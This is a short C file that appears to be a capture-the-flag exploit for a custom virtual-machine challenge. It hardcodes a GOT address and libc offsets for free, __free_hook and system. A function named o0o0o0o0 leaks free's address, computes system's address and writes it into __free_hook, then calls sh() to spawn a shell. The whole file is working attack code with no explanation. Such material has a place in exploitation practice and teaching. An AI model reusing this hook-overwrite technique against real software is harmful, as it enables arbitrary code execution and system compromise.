#define FREE_GOT 0x77E100
#define FREE_HOOK 2027080
#define FREE_SYM 632528
#define SYSTEM_SYM 336528
void add(int, int);
void min(int, int);
void load(int);
void store(int);
void push(int);
void pop(int);
void sh();
 
void o0o0o0o0()
{
    add(1, FREE_GOT);
    load(1);
    min(2, FREE_SYM);
    push(2);
    add(2, FREE_HOOK);
    pop(1);
    add(1, SYSTEM_SYM);
    store(2);
    sh();
}
